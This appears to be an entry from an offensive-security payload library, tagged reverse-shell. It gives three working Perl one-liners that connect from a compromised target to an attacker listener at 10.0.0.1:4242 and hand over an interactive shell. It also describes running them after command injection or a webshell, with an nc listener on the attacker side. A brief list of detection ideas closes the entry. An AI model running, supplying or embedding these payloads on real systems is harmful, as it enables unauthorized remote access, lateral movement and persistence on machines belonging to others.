---
id: ded85b03-72c9-40bd-a5e1-ebae7477ee7c
type: code
language: Perl
verified: true
created_at: '2023-04-06T03:56:24.226201+00:00'
updated_at: '2023-04-10T20:25:29.860750+00:00'
platforms:
  - Linux
  - Unix
  - Windows
tags:
  - reverse-shell
  - payload
  - perl
validated: true
---

# Perl-Reverse-Shell-One-Liners

## Code

```perl
perl -e 'use Socket;$i="10.0.0.1";$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.0.0.1:4242");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'


NOTE: Windows only
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"10.0.0.1:4242");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

## Description

This code provides three Perl one-liner variants for establishing a TCP reverse shell from a target to an attacker listener. The first uses the Socket module for a basic connection on Unix-like systems. The second uses the IO module with forking for improved stability on Unix. The third is a non-forked IO version compatible with Windows. Each creates a socket to the attacker's IP/port, redirects stdin/stdout/stderr, and spawns a shell for interactive access.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $_ATTACKER_IP | IP address of the attacker's listening machine | 10.0.0.1 |
| $_ATTACKER_PORT | TCP port on which the attacker is listening | 4242 |

## Usage

These one-liners are executed directly on the target after gaining initial code execution (e.g., via command injection or webshell). First, start a listener on the attacker side (e.g., `nc -lvnp $_ATTACKER_PORT`). Then, run the appropriate variant on the target, substituting parameters. The connection will provide a shell prompt in the listener. Used in post-exploitation for lateral movement or persistence.

## Detection

- Monitor for Perl processes spawning with Socket or IO::Socket::INET modules via process auditing (e.g., Sysmon on Windows, auditd on Linux).
- Network logs showing outbound TCP connections from internal hosts to unusual IPs/ports.
- Behavioral analytics flagging one-liner Perl executions or unexpected shell spawns from Perl.
- File integrity monitoring if scripts are written to disk before execution.

## Related

- [[procedures/Establish-Reverse-Shell-Using-Perl]]
